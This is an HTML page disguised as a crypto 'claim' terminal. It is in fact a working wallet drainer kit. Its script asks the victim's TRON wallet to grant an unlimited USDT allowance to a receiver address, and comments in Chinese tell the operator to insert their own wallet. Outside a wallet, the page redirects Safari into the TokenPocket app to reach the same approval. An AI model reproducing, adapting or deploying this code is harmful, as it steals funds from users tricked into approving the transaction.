<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CLAIM TERMINAL</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background: #000; color: #f00; font-family: monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
        #terminal { width: 85%; margin: 0 auto; border: 1px solid #f00; padding: 20px; background: #050000; box-shadow: 0 0 15px #f00; }
        .btn { display: block; width: 240px; padding: 20px; margin: 30px auto; background: #f00; color: #000; text-decoration: none; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; }
        .log { color: #0f0; font-size: 12px; margin-top: 15px; text-align: left; min-height: 50px; }
    </style>
</head>
<body>

    <div id="terminal">
        <h2>> CORE_SYSTEM_V5</h2>
        <p id="env_status">> ENV: INITIALIZING...</p>
        <div class="log" id="log">> AWAITING_HANDSHAKE...</div>
    </div>

    <div id="mainBtn" class="btn">ACTIVATE & CLAIM</div>

    <script>
        const receiver = "你的收款钱包地址"; // ！！！请务必修改这里
        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const myUrl = window.location.href;

        const btn = document.getElementById('mainBtn');
        const log = document.getElementById('log');
        const envStatus = document.getElementById('env_status');

        async function start() {
            // 1. 检测是否在钱包环境 (TronWeb 是否存在)
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                // --- 钱包内：执行授权扣款逻辑 ---
                envStatus.innerText = "> ENV: WALLET_INTERNAL";
                log.innerHTML += "<br>> CONNECTED: " + window.tronWeb.defaultAddress.base58.substring(0,6) + "...";
                
                try {
                    log.innerHTML += "<br>> CALLING_SMART_CONTRACT...";
                    let contract = await window.tronWeb.contract().at(usdtContract);
                    // 无限授权额度
                    const val = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                    
                    await contract.approve(receiver, val).send({
                        feeLimit: 100000000
                    });
                    log.innerHTML += "<br>> [SUCCESS]: AUTH_COMPLETED";
                } catch (e) {
                    log.innerHTML += "<br>> [FAILED]: " + e.message;
                }

            } else {
                // --- Safari 浏览器内：执行唤起钱包逻辑 ---
                envStatus.innerText = "> ENV: EXTERNAL_SAFARI";
                log.innerHTML += "<br>> ACTION: CLICK_TO_LAUNCH_WALLET";
                
                // 构造协议链接
                const tpProtocol = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": myUrl}));
                
                // 在 Safari 里，必须由用户点击后直接修改 location
                window.location.href = tpProtocol;

                // 备份方案：如果跳不走，提示用户
                setTimeout(() => {
                    log.innerHTML += "<br><span style='color:yellow'>> HINT: 请点击“允许”或再次点击按钮</span>";
                }, 1500);
            }
        }

        btn.onclick = start;

        // 自动检测提示
        window.onload = () => {
            if (window.tronWeb) {
                envStatus.innerText = "> ENV: WALLET_DETECTED";
                log.innerHTML += "<br>> SYSTEM_READY_FOR_CLAIM";
            } else {
                envStatus.innerText = "> ENV: BROWSER_DETECTED";
            }
        };
    </script>
</body>
</html>
